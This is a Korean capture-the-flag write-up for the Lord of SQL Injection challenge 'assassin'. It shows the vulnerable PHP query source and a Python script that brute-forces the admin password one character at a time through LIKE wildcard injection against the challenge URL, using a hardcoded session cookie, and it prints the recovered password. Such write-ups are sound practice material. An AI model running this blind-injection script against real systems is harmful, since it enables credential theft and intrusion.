# Lord of SQL Injection No.15 - assassin

## 문제 출제 의도

LIKE문의 취약점을 이용하여 Blind SQL Injection을 할 수 있는지 확인한다.

## 소스 코드 분석
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/\'/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_assassin where pw like '{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
  if($result['id'] == 'admin') solve("assassin"); 
  highlight_file(__FILE__); 
?>
```
* preg_match 에서 '를 필터링해낸다.

* like를 이용하여 pw값을 GET 방식으로 입력하여 admin의 비밀번호를 찾는것이 문제이다.

## 문제 해결 방안
```python
import urllib.request   # python 라이브러리에 내장된 urllib.request 를 불러온다.
from urllib.parse import quote

result = "" # pw 값을 저장할 문자열 변수

for i in range(1,9):
    for j in range(ord('0'),ord('z')):
        url = "http://los.eagle-jump.org/assassin_bec1c90a48bc3a9f95fbf0c8ae8c88e1.php?pw="  # SQL Injection 공격 대상인 URL에서 변경되지 않는 부분이다.
        add_url = "{}%".format(result+chr(j))
        print("Searching.. - {0}{1}".format(url, add_url))
        add_url = quote(add_url)
        new_url = url + add_url
        re = urllib.request.Request(new_url)

        re.add_header("User-Agent","Mozilla/5.0")
        re.add_header("Cookie", "PHPSESSID=ae1i7c038nndgup1torche1pt7")

        res = urllib.request.urlopen(re)
        res1 = res.read()
        if str(res1).find("Hello admin") != -1: # Hello admin 이라는 문자열이 있는지 확인한다.
            result += chr(j).lower()
            print("Found it!! => " + result)
            break
        elif str(res1).find("Hello guest") != -1: # Hello guest가 Hello admin보다 상위 레코드에 있으면 Hello guest의 앞글자가 Hello admin이 될수 있으므로 검사한다.
            result += chr(j).lower()
            print("Found it!! => " + result)
            break

print("Finished Searching.")
print("Password : " + result)
```
* % 와일드 카드 이용 % 와일드 카드의 경우 문자열을 보충해 찾아주는 역할을 한다.

%a 의경우 …a 인 a로 끝나는 문자열을 찾으며 a%의 경우 a로 시작하는 문자열을 찾는다.

* 나머지 설명은 코드에서 했다.

저 코드를 이용할 경우 답인 832edd10가 출력되고 그것을 입력하면 답 ! >_<